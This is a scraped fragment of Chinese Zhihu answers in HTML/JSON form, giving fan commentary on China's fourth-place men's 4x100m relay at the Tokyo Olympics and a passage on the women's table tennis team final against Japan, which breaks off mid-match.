data-original-src=\"v2-cc12df8436067a80b7aa7c4bfaa1497b\" data-watermark-src=\"v2-027efbc8a13cc7bb9489ed8507691e6d\" data-private-watermark-src=\"v2-bf556e669c6d50037239aab16e008b6e\"></p>\n<p><br></p>\n<p>意大利田径队是今夏东京田径赛场上最大的黑马，中国田径队是中国代表队里最让人欣喜的队伍——哪怕他/她们的目标都只是进入决赛、争取名次。</p>\n<p>这些无奖牌的王者，真的是中国体育的骄傲。</p>\n<p><br></p>\n<hr>\n<p>4x100米可以说的点太多了，往详细了说——</p>\n<p><br></p>\n<p>「奥运会是国与国之间无硝烟的战争」这句话让顾拜旦（现代奥运会主要倡导者）听到，估计会气的七窍生烟。但说4x100米接力项目，是国与国之间最强速度的PK，这个描述问题就不大——100米/200米项目都是个体天才间的pk，4x100米这样的接力，就完美体现了最强的速度、最高的默契、最完美的/零容忍的技术要求。</p>\n<p>可能是整届奥运会最紧张刺激的项目（之一）。</p>\n<p><br></p>\n<p><b>25岁的汤星强、27岁的谢震业、32岁的苏炳添、27岁的吴智强，他们代表的中国速度，真的完全不亚于中国其他领域的速度。</b></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-1d7c0c20cf2a6f9527ec4580153ae127_720w.jpg?rss\" data-caption=\"预赛小组第一\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-1d7c0c20cf2a6f9527ec4580153ae127\" data-watermark-src=\"v2-e0e1adfea571518903404993c7867568\" data-private-watermark-src=\"v2-9e01dfefb3e5355ab1ac4a6116c6fa05\"></p>\n<h2>\n<br>预赛回顾：超神的小组第一，力压美加意等短跑强国</h2>\n<p><br></p>\n<p>预赛两组。</p>\n<p>第一组牙买加、英国、日本、特立尼达和多巴哥、法国、南非都算是有进入决赛实力的。最终牙买加（37秒82）、英国（38秒02）、日本（38秒16）晋级；</p>\n<p>我们在第二组，<b>汤星强、谢震业、苏炳添、吴智强跑出37秒92，力压加拿大、意大利等强队，第二组排名第一晋级决赛。</b></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-9a492c2ad3130c85c9c41014d99bef4f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-9a492c2ad3130c85c9c41014d99bef4f\" data-watermark-src=\"v2-8c663fbabc3df4c1e2df077364365a2c\" data-private-watermark-src=\"v2-5816b498fe42b8087d1814e926432d43\"></p>\n<p><br></p>\n<p>预赛中国队发挥并不算完美，交接棒的一些衔接细节可以做得更好些。</p>\n<p><b>但37秒92本赛季最佳、小组第一晋级的结果，完全不需要吹毛求疵了——汤星强的起跑足够给力、谢震业守住了领先优势、第三棒苏炳添的表现天神下凡生生创造出距离差、而最后一棒吴智强也完全没让加拿大的迫近变成逆转。</b></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-dc1c5483289690ec3852afd8b96a2634_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"690\" data-rawheight=\"460\" data-watermark=\"watermark\" data-original-src=\"v2-dc1c5483289690ec3852afd8b96a2634\" data-watermark-src=\"v2-c74d92a122e191c35f696a0b59d26e4b\" data-private-watermark-src=\"v2-696695d33ae6f77dce93d3fd78229b62\"></p>\n<p><br></p>\n<p>美国出人意料的小组第六（38秒10）、以0.02秒的微弱劣势没能晋级决赛——赛后网上那个小视频估计大家都看到了。<b>苏神问谢震业美国队情况，小谢抿着水摇着手指、一脸坏笑说，“（美国队）没进（决赛），小组第六！”</b></p>\n<p>淘气。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-9107901260c9fc86bbca5af8051820d8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2858\" data-rawheight=\"1558\" data-watermark=\"watermark\" data-original-src=\"v2-9107901260c9fc86bbca5af8051820d8\" data-watermark-src=\"v2-93d72687e8eddada5575da9c8fd1894b\" data-private-watermark-src=\"v2-d204d799e6a8348a1fddd0d3cdebc4d8\"></p>\n<p><br></p>\n<p>特别提一下美国队。</p>\n<p>美国的短跑和4x100接力队，自古以来（从1912年奥运设项来）都是全世界第一档的水准——<b>奥运会4x100一共25次（男子）比赛，美国拿了15次冠军、2次亚军。</b></p>\n<p>一度是碾压式的短跑接力梦之队。</p>\n<p>但牙买加崛起后，美国在短跑上就陷入特别尴尬的境地，屡战屡败。上一次拿到金牌已经是悉尼奥运会、过去20多年了。</p>\n<p>2019年多哈世锦赛美国队非常强势夺冠，当时老美全国都有一种被牙买加压迫了那么多年、翻身农奴把歌唱的喜悦。结果东京奥运会科尔曼禁赛、贾斯汀老去，今年短跑美国又表现的很萎靡。</p>\n<p>接力尤其拉胯。</p>\n<p><br></p>\n<p><b>不夸张的说，中国这几年不见得4x100就完全不敢/不该和美国比，相反我们有些年轻人冒起来——这篇内容最后会提到——我们是完全可以掰一掰手腕的。</b></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-e0153436b3795cfbf0389763434d0540_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-e0153436b3795cfbf0389763434d0540\" data-watermark-src=\"v2-3a14f9697e583b4154e5ecfb73997e16\" data-private-watermark-src=\"v2-3ecb1c7ff446b38b44c440e5d9607a7e\"></p>\n<p><br></p>\n<p>就事论事，再多说一下预赛的分组。</p>\n<p>之前接力分组出来后，有声音说日本把自己分在弱组，把中国放进死亡组。这种争议有点没有必要。</p>\n<p>一来日本自身不弱，二来接力谈不上多少能放水的（除非最后一棒大幅领先），和强队一组反而能跑得更快，且日本那组真的不弱。就算拿不到前三也能靠更快成绩进决赛。</p>\n<p><br></p>\n<p>这样进入决赛的八支接力队，按半决赛成绩依次是，牙买加、中国、加拿大、意大利、英国、德国、加纳、日本。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-2e702ed1f0628514393a7200b2a488cf_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1656\" data-rawheight=\"656\" data-watermark=\"watermark\" data-original-src=\"v2-2e702ed1f0628514393a7200b2a488cf\" data-watermark-src=\"v2-6c7690b425761c5d28e1aca802f1f203\" data-private-watermark-src=\"v2-38ae798a7e3ae668d3a91093f2ddb3f4\"></p>\n<p><br></p>\n<h2>决赛：再次第四，追平国家纪录！</h2>\n<p>中国第七道。</p>\n<p>第七道是不错的道次，两边一个是接力老牌强队英国，一个是今年让人刮目相看的意大利（横空出世，确实很多人都没想到）。小日本最外道。</p>\n<p>汤星强、谢震业、苏炳添、吴智强，四人出场的亮相是小悟空爆气的动作。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-a3ae3c0efb10e325d01dcd7752e6f366_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"337\" data-watermark=\"watermark\" data-original-src=\"v2-a3ae3c0efb10e325d01dcd7752e6f366\" data-watermark-src=\"v2-c287f38bb92511f344319424efa2211f\" data-private-watermark-src=\"v2-e203a5710cd66aaa1765cae0c42d199f\"></p>\n<p><br></p>\n<p>比赛开始。</p>\n<p>汤星强0.153秒起跑反应，位列第5。从起跑到加速这一段相比其它选手没有什么优势（毕竟决赛第一道就没弱的），不过<b>在完成加速-进入最高速度时，维持极速相当不错。交接棒之前缩小了一些和洛伦佐（意大利）的差距</b>；</p>\n<p>第二棒给到谢震业后，小谢的过渡也是相当顺利的。而老对手日本队，可能过于兴奋/紧张，居然掉棒了……</p>\n<p>第三棒的苏炳添，自然是最强的 （<a href=\"https://www.zhihu.com/question/296458587/answer/508135456\" class=\"internal\">为什么苏炳添4*100米跑第三棒弯道？</a> ）。<b>苏炳添在英国队的外道，和同是老将的理查德·基尔蒂直接PK，死死咬住，几乎抹平了差距</b>；</p>\n<p>最后一棒吴智强是<b>惋惜后的惊喜</b>。</p>\n<p><b>吴智强的启动有点儿可惜，交接棒的启动节奏早了……甚至可能感觉出苏炳添的一丝懊恼。本来3-4棒交接这段，中国完全有可能追平英国、微超意大利。</b></p>\n<p><b>但这种可惜很快又变成一种惊喜，吴智强死死的压住了奥布利克·塞维尔（20岁的小将，百米尚未跑进10秒），将这种微弱领先保持住了。</b></p>\n<p><br></p>\n<p>意大利（菲利帕）和英国（米切尔·布莱克）的冲刺相当优秀，也决定了最终的名次。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-c5750d9ab6f2272b179d722d21640b83_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-c5750d9ab6f2272b179d722d21640b83\" data-watermark-src=\"v2-08d0a57bd0340d6037f1d3ef29548f4a\" data-private-watermark-src=\"v2-fddd1be1a64a00a596372a2249cb2419\"></p>\n<p><br></p>\n<p><b>汤星强起跑足够出色、谢震业顺利过渡、苏炳添疯狂的追赶、吴智强有小失误不过后面全程力压牙买加——37秒79，追平国家纪录</b>（2019年多哈世锦赛，苏炳添/许周政/吴智强/谢震业）！</p>\n<p>与上一届里约奥运会一样，还是<b>决赛第四</b>——甚至跑赢了牙买加（0.05秒）！</p>\n<p>只落后铜牌加拿大0.09秒，加拿大的个体实力很高，交接棒技术只能算一般。而交接棒技术一直是世界最佳的日本和牙买加，今天却纷纷表现的非常业余。</p>\n<p><br></p>\n<p>中国队的表现，则真的相当出色。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-d722048f4604475aef1050167d39e5bc_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-d722048f4604475aef1050167d39e5bc\" data-watermark-src=\"v2-7aeffd36c220ae50780d0d19b348b859\" data-private-watermark-src=\"v2-5753474e589fdf5b0db175f5aa766aa9\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-c5750d9ab6f2272b179d722d21640b83_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-c5750d9ab6f2272b179d722d21640b83\" data-watermark-src=\"v2-08d0a57bd0340d6037f1d3ef29548f4a\" data-private-watermark-src=\"v2-fddd1be1a64a00a596372a2249cb2419\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-24b15adc47f6843c25336f7f79d3671f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"1366\" data-watermark=\"watermark\" data-original-src=\"v2-24b15adc47f6843c25336f7f79d3671f\" data-watermark-src=\"v2-49c4619611736d0b0343eaa0480c1741\" data-private-watermark-src=\"v2-d7b09e5140b397722702f5877c6bf862\"></p>\n<h2>\n<br>中国短跑接力队的昨天、今天和明天</h2>\n<p>太远古时期不提。<b>近年中国短跑和短跑接力兴起，也就是11、12年左右的事，正好十年前苏炳添、张培萌这一代起来。</b></p>\n<p>中国田径队前总教练冯树勇几年前说过一段话，大意是<b>中国接力队此前从上到下都“干劲不足”，大家抱着“人人弱则团体更弱”的心态。结果隔壁日本起了好榜样，4个百米都没破过十的选手，接力队却能和欧美扳手腕，于是从近邻身上得到信心，才有了后面几年可圈可点的成绩。</b></p>\n<p><br></p>\n<p>感兴趣可以看看这个回答，提到不少以前几支接力队：</p>\n<a href=\"https://www.zhihu.com/question/296458587/answer/508135456\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-0d638eaf077707b53a0867e157bc41fd_bh.jpg\" data-image-width=\"2252\" data-image-height=\"836\" class=\"internal\">4x100米接力，为什么苏炳添会跑第三棒弯道？</a><p><br></p>\n<p>2016年，苏炳添接受采访时曾提到这样一句话，“<b>希望中国能多出几个百米跑到10秒20的年轻选手，这样中国接力队才能继续保持竞争力。</b>”当时铁打的最后一棒张培萌已近退役，苏炳添自己也快30。</p>\n<p>2015年北京世锦赛拿到银牌后，很多人就已经担心那支中国接力队已达到上限、很怕后继无人。</p>\n<p>然而这两年中国短跑很神奇的涌现出一大批很值得期待的年轻人。比如“00后”的<b>陈冠锋</b>（10秒06）、<b>何宇鸿</b>（10秒18）、<b>黄永炼</b>（10秒31）、<b>严海滨</b>（10秒22），以及禤达军、王智弘、陈程、李文杰……</p>\n<p><br></p>\n<p>其中比如严海滨，是2003年出生的小将，今年东京奥运会已经是接力队的替补了（这小伙100和200米都有很强竞争力）。还有今年屡次刷新个人最快的陈冠锋、去年刷新34年历史全国青年百米纪录的何宇鸿，<b>不少都已经比苏炳添们同龄时期表现的更为出色</b>。</p>\n<p>后生可畏。</p>\n<p>记住这些年轻的名字吧。</p>\n<p><b>兴许以他们的年龄和实力，在东京奥运会周期还无法挑大梁，不过明年的亚运会和世锦赛、包括三年后的巴黎奥运会，他们兴许就能慢慢接过苏炳添的旗帜。</b></p>\n<p>毕竟届时苏神已经35岁了。</p>\n<p>再加上梁劲生等依然还在当打年的“老将”（很可惜，今年4月底梁劲生拉伤，不然东京很有可能看到他），<b>中国接力队未来几年完全具备成为世界强队的可能。</b></p>\n<p><br></p>\n<p>至于这个上限是多少，比较现实的，</p>\n<ul>\n<li>稳定发挥确保进入决赛、赢下与老对手日本队「亚洲一哥」的较量、冲击前五甚至领奖台的名次；</li>\n<li>用交接棒的技术默契度弥补个体上的差异，用完善的青少年田径梯队人才去抗衡日本卡塔尔等存在的归化/混血军团（比如日本之前的萨尼·布朗）；</li>\n<li>也别像美国、特立尼达和多巴哥们一样，经常动不动交接棒环节拉胯、用低级失误白白浪费天赋；</li>\n</ul>\n<p><br></p>\n<p>另外最近20年，牙买加、美国、英国等接力强队都在药物问题上出现过问题，有隔了快十年成绩被作废、奖牌回收的黑历史——干干净净的跑，干干净净的赢。起码现在看，中国短跑国家队在这点上做得挺不错的。</p>\n<p><br></p>\n<p>继续加油，中国接力队！</p>\n<p>（通篇提的都是中国短跑接力男队，后面有时间再说说女队，同样是好样的）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-90a3e13851db76792d718804d9adee7f_720w.jpg?rss\" data-caption=\"最后一棒吴智强有遗憾有惊喜\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-90a3e13851db76792d718804d9adee7f\" data-watermark-src=\"v2-7d486b756e0ad33bd077e2037ebb5f47\" data-private-watermark-src=\"v2-c48799b733b3417771b12b432ba9b796\"></p>\n<hr>\n<p>东京奥运会期间，相关的赛事资讯都会在知乎想法中发布，感谢关注<a href=\"https://www.zhihu.com/org/yun-dong-fen-zi-cheng-lan-wen-hua\" class=\"internal\">运动分子</a></p>\n<hr>\n<ul>\n<li><a href=\"https://www.zhihu.com/question/476493978/answer/2032949449\" class=\"internal\">2020 东京奥运跳水女子 3 米跳板决赛施廷懋、王涵包揽冠亚军，如何评价本场比赛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/476149568/answer/2029677017\" class=\"internal\">2020 东京奥运田径男子 10000 米埃塞俄比亚选手巴雷加夺得田径首金，如何评价本场比赛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/476000617/answer/2028599848\" class=\"internal\">如何评价 2020 东京奥运会游泳男子 200 米个人混合泳决赛汪顺夺金？</a></li>\n<li><a href=\"https://www.zhihu.com/question/474850082/answer/2026108063\" class=\"internal\">奥运射击选手是如何看清靶子的？</a></li>\n<li><a href=\"https://www.zhihu.com/question/474575633/answer/2024002780\" class=\"internal\">为什么一些国家的奥运乒乓球选手是华人？</a></li>\n<li><a href=\"https://www.zhihu.com/question/50191573/answer/1953518631\" class=\"internal\">为什么中国运动员运动寿命短？</a></li>\n<li><a href=\"https://www.zhihu.com/question/344468000/answer/1854947316\" class=\"internal\">新中国体育史上，有哪些比赛的瞬间令你沸腾？</a></li>\n<li><a href=\"https://www.zhihu.com/question/373511126/answer/1608008791\" class=\"internal\">举重运动员有多牛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/341661943/answer/1452491051\" class=\"internal\">撑杆跳这项运动的意义是什么，是如何发明的？</a></li>\n<li><a href=\"https://www.zhihu.com/question/293545938/answer/489299124\" class=\"internal\">一个身体素质普通的人被车拉着能达到博尔特的速度吗？</a></li>\n<li><a href=\"https://www.zhihu.com/question/39665045/answer/275431053\" class=\"internal\">历史上有哪些精心布局却被对方一下破局的故事？</a></li>\n<li><a href=\"https://www.zhihu.com/question/20403477/answer/712635036\" class=\"internal\">110 米栏的顶级运动员，为什么他们不参加100米的比赛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/302684797/answer/544389984\" class=\"internal\">男生100m跑到11s很奇怪嘛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/282601379/answer/528371413\" class=\"internal\">跑150米然后截取速度最快的连续100米区间作为100米的成绩是否更合理？</a></li>\n<li><a href=\"https://www.zhihu.com/question/352385663/answer/884879335\" class=\"internal\">为什么马拉松选手最后不冲刺？</a></li>\n<li><a href=\"https://www.zhihu.com/question/39239070/answer/594491009\" class=\"internal\">体育赛事中有哪些「几乎不可破」的纪录？</a></li>\n<li><a href=\"https://www.zhihu.com/question/24987243/answer/1357448925\" class=\"internal\">跑5公里需要多少分钟？</a></li>\n<li><a href=\"https://www.zhihu.com/question/407047274/answer/1363793504\" class=\"internal\">很多退役的军人都说自己五公里可以15/16分，军队的训练真的这么强么？</a></li>\n</ul>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/yun-dong-fen-zi-cheng-lan-wen-hua?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">运动分子</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/477844835/answer/2043691123?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">356 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/476382083?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价 2020 东京奥运田径女子组100米决赛？</a><br><a href=\"http://www.zhihu.com/question/476457735?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价 2020 东京奥运会女子 4x100 米混合泳接力决赛中国队获第 4 ？</a><br>\n","link":"http://www.zhihu.com/question/477844835/answer/2043691123?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"2020 东京奥运乒乓球女团中国 3:0 完胜日本夺冠，如何评价本场比赛？","date":"2021-08-05 12:52:48","description":"\n<p><b>恭喜中国队3比0战胜日本！</b></p>\n<p>本届奥运会，中日女子选手仅在女单半决赛上交锋一次，即为经典的孙颖莎伊藤之战：</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/answer/2026457583\" class=\"internal\">叶子盛：2020 东京奥运会乒乓球女单半决赛孙颖莎 4:0 轻取伊藤美诚，如何评价本场比赛？</a><p>中方的陈梦、孙颖莎、王曼昱三位大将，对日本大姐大伊藤的胜率均是极高的。孙颖莎更是刚刚4比0取胜，对于队友的士气是极大鼓舞。平野虽曾17年表现极其亮眼，但自从被国乒研究后，反手长下旋被盯死，后来一直便没有特别出色的战绩。然而，这是日本的主场，且国乒被其研究了许久。伊藤和平野的打法比较看状态，要防止爆发的可能。这次终于在决赛上相遇，尚有不小的悬念。希望中国队可以迅速取胜，消除任何小概率事件发生的土壤。</p>\n<hr>\n<h2>第一场 双打</h2>\n<p>第一场双打，陈梦/王曼昱对战石川/平野。伊藤留作生力军打单打了。日方上来几回合内就锁了个两个直线，对中国队的习惯、跑位是有较深的研究的。日方选手一个左手一个右手，相比中国两个右手还是有一定跑位优势。</p>\n<p>石川打得很凶，能反拉就反拉，能近台加力快带就快带。局初段我方不太适应，速度有点跟不上，再加上日本有两个运气球，比分到了局中有点落后。日本的配合、线路目前而言要比我方强上一些。</p>\n<p>第一局中后段，日方吃了两个发球。再加上我方抡出了几个质量，实力球还是比日方功底深厚，比分一度扳至八平。然而，日方的线路优势再次发挥作用，连续的正手锁直线，把中方攻得有些措手不及。之后虽我方追上一分，但其后仍被逼到远台，尝试反攻失分。</p>\n<p>我方第一局打得还是有点拘谨，起板的落点也没拉开。这样被对方一左一右调动得太被动，质量优势就显现不出来了。看看第二局换发球接发球轮以后会不会有改观，中国队也需要适应对手的时间。</p>\n<p>偶数局上来似乎中国队明显要舒服一些，平野的综合实力相比石川还是差些，中方能给出更多质量来。虽然石川0比4落后时有一个精彩的侧身爆冲，但并不能挽回下风的气势。见形势大比分落后，再加上本轮次日方限制线路的打法不奏效，接发球也出了不少问题，日本队全部搏杀（且成功率不高，因为不是计划内的战术），速败。关键还是要看第三局，现在的气势我方占优。</p>\n<p>平野的发球我们还是吃了一点的，在下一个轮次尤其要注意。不过王曼昱主要是拧拉为主，吃发球的几率不大，但是回球的落点一定要多想想。陈梦的质量也一定要出得来。</p>\n<p>第三局开始。日本基本的战术还是先锁直线/平野挑大斜线，锁住中国队的正手位，随后再调动回反手位。如此一来，由于中国队是双右手组合，就很容易挤压在一起。王曼昱接发的拧拉还是基本回在对方中路上，如果能多些变化就更好了。</p>\n<p>2比4时是中国队的好球，石川的打法还是比较拼，积极用正手时反手位露出了空当。可以多考虑从这里做文章。5比6时的那球也非常好，一定不能像前面几回合那样送中路，多给点反手，多给点重复落点。对面虽是一左一右，但武器库都不完善，想要拼中国队都需要舍近求远，还是有机会能挤压住对方空间的。</p>\n<p>七平时的回合中国队落点给得非常好，多板对拉后拿下很长气势，本可以成为关键节点，但随后日本就是一个运气球得分。笔者仍感到微微担忧，前途未卜。好在国乒二位在八平后又来了一个对拉得分，打得超出了石川的能力范围，随后一鼓作气拿下本局。</p>\n<p>第三局实在是太关键了…好在中国队成功咬了下来。接下来一定要乘胜追击拿下。有个比较有趣的事在于，陈王二位发球前的沟通，是不是应该稍微小声点…石川和平野应该都能听懂（</p>\n<p>第四局第一个回合平野的反手上手就开始加质量，石川也增强了搏杀力度。中国队有所失误，但力量占据优势，双方战至小分3比3仍是僵持状态。日方的短球还是有所欠缺的，力量也不占优，3比5落后之后叫了暂停。暂停结束后，日方挑打失误，随后又被中国队抢先上手，比分拉开了不小。本局日方的多数得分点还是在控制我方的正手上，又是连续两个锁直线送我们正手的得分了。</p>\n<p>日本5比8落后时，石川反手反拉的完美落点得分，把日本队的气势又带出来了。随后是石川的抢攻套路得分，目前中日仅一分之差。王曼昱的反手在此时发挥了极大作用，力量大，速度快，最后更是一板拧拉一击致命，抢下了第一场双打。</p>\n<p>这场双打对我们太珍贵了。孙颖莎对伊藤并非必胜，日本这次的冲击力是很大的。中国队开了个好头。</p>\n<hr>\n<h2>第二场 孙颖莎 vs 伊藤</h2>\n<p>孙颖莎再战伊藤，刺激。</p>\n<p>第一局以生胶的慢热，孙颖莎是需要拿下的。开局领先，伊藤反手还没什么球，侧剌之类的很少上台，正手也有失误。但孙颖莎还是吃了发球的，这一点需要注意。</p>\n<p>先不论输赢，有一点是中国队的进步，也是信心的提升，那就是孙颖莎完全不怕接发球劈长后与伊藤对反手了。伊藤也明白这一点，在局中段积极求变，反而多去送孙颖莎的正手及中路偏正手。孙颖莎反倒不太舒服，尤其是六平那一球，生胶球送到这个位置的轨迹孙颖莎不太适应。</p>\n<p>有点在跟着伊藤的节奏走。孙颖莎还是要再把节奏放慢点，质量要出得来。比如7比8的那球就很好，多等一个点，质量再提高一点。今天伊藤的打法有所变化，没有完全扑在台子上，孙颖莎也要适时进行调整。</p>\n<p>非常好，孙颖莎的节奏慢下来了。伊藤站在偏中台的位置，不再以快取胜，而是节奏变化加上颗粒的怪。但孙颖莎只要盯住了把质量加上去，哪怕稍微慢一点，也是不怕伊藤拍弧圈的。事实上，伊藤目前为止的打法就不是近台拍。果然采取更合理的战术后，孙颖莎连下四分，夺下第一局。</p>\n<p>第二局似乎伊藤打算变招了，回到老战术，速度极快。不论哪种打法，伊藤都是有相当大的威胁的。孙颖莎如果质量出得来，打得还是非常顺手，但伊藤的起板盯住孙颖莎的反手大斜线以及中路偏正手，还是有点难受。双方拉锯至五平。</p>\n<p>伊藤与孙颖莎进入持续反手相持，孙颖莎的反手状态不错，摩擦感觉很好，持续把颗粒回的下沉球挂住，并寻隙加力至伊藤反手大角得分。伊藤对自己的反手不太自信，心态受到了影响，发球失误。教练赶紧叫暂停。</p>\n<p>居然还把伊藤发球失误做成慢动作回放hhh这个编导有点腹黑（</p>\n<p>暂停结束，孙颖莎反手质量依旧可圈可点，前三板的计算也比伊藤更精良，起板快，线路好，发球伊藤也还没掌握规律。孙颖莎迅速拿下第二局，形势很不错。</p>\n<p>伊藤从单打半决赛开始就吃孙颖莎的中路发球，现在还吃，日本队这届教练不行啊…</p>\n<p>第三局第一回合，伊藤的线路无可挑剔。但就像马龙对樊振东的决赛，樊振东的线路很好，但马龙就是更胜一筹。孙颖莎的线路显得更加刁钻，气势极盛。不过紧接着吃了个不转发球，士气受了影响，后面又吃了一个。</p>\n<p>前两局里孙颖莎严格意义上来说，也有些吃发球，但只要劈到了底线，倒也不怕伊藤起板相持。这局的几个吃发球不同，要么出界，要么台内冒得老高，就完全没有周旋的余地了。伊藤这局的正反手状态均非常好，零失误。8比2领先时更是上演了一个瞎拍神球。不知孙颖莎是会复现半决赛第二局的逆转，还是会战略性先放掉一局。</p>\n<p>孙颖莎这局没什么出手的机会，伊藤的状态开始出来了，值得警惕。孙颖莎吃伊藤的不转吃了非常多个，笔者粗略数数就起码有三个。还是要咬住，质量要加上去。线路也要多想想，接发球送反手太多了也容易被算住。</p>\n<p>第四局孙颖莎上来有点小宇宙爆发的意思了，质量非常高，伊藤几乎没有还手之力。后面伴随着孙颖莎的两个运气球、伊藤的机会球失误、孙颖莎的完美接发，比分迅速拉开，孙颖莎7比2领先。但接下来伊藤扳回一分，告诉孙颖莎自己相持的状态仍在。孙颖莎再次劈长擦边，又是一个运气球，伊藤已经哭笑不得了。</p>\n<p>孙颖莎得理不饶人，正反手全力施为，力量拉满，穿直线、反手爆拉侧切，直接把伊藤的花样全部破掉，11比3取得胜利，中国队大分2比0领先日本。</p>\n<p>本场比赛，伊藤第一二局的战术变化可圈可点，给孙颖莎造成了一定的不适应。团体五局三胜，节奏快，易爆冷，孙颖莎输了一局是有较大压力的。好在孙颖莎顶住压力，后半盘更是顺风拿下，奥运赛场连续两次战胜伊藤，基本已锁定了24巴黎的单打名额。</p>\n<hr>\n<h2>第三场 王曼昱 vs 平野</h2>\n<p>本次奥运国乒启用p卡，换王曼昱上场。固然有刘诗雯伤病缘故，自然也有培养新生代之意。王曼昱实力自然比平野强不少，尤其自17年国乒对平野深入研究后。笔者记得那时平野和国乒多人都碰过了，大家都拿一个打法打她——送反手、中路长，不管是发球还是接发劈长，但她就是摆脱不了（</p>\n<p>开局平野速度很快，这也是她的特长。王曼昱作为实力占优的一方，千万不要跟着以快打快，否则动作不到位，高速相持中就容易下网失误。王曼昱身高臂长，一定要把速度慢下来，质量加上去。王曼昱也确实是这么做的，很顺利就拿下第一局。</p>\n<p>第二局王曼昱上来就全面占优，逼日本叫了暂停。这个暂停叫得好，把王曼昱火热的状态叫没了。一个台内轻挑直线，一个反手起板，一个扑在近台的摆速得分，平野扳回局势。中间王曼昱的劈长思路还是对的，但那球旋转还没加上去，没送到平野的弱点上。王曼昱还是要多加旋转上去，要劈长就剁下去，要上手就像双打最后几球一样，把质量都打出来，平野的速度就被限制了。比如王曼昱4比7落后的那个劈长，做得就比前半段的好。</p>\n<p>看来这个劈长是王曼昱想明白后状态回暖的关键点，王曼昱一路追分至七平，但在八平后还是被平野套路了一个线路，到关键球了。下一回合虽然勉力撑住得分，但还是很被动，让人心惊肉跳。</p>\n<p>九平，王曼昱手握两个发球。平野的正手落点到了正手小三角，速度位置都近乎完美。但王曼昱拥有力量优势，身高臂长，护台极广，硬是直接步法到位快带回来。平野扛不住质量，回防出现机会，被王曼昱穿直线直接得分。这一球太精彩了，平野打到那个落点估计认为自己已经有了。这一分拿下，基本这局已经很上风。果然王曼昱紧接着在相持中稳住，而平野急于拉穿失分，王曼昱逆转第二局！</p>\n<p><img src=\"https://pic1.zhimg.com/v2-fed11cb3ea4723a3a5ace3d3a0db6472_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1117\" data-size=\"normal\" data-caption=\"图源：咪咕直播截图\" data-watermark=\"watermark\" data-original-src=\"v2-fed11cb3ea4723a3a5ace3d3a0db6472\" data-watermark-src=\"v2-ecb2460cc3694270fdc17a0915001329\" 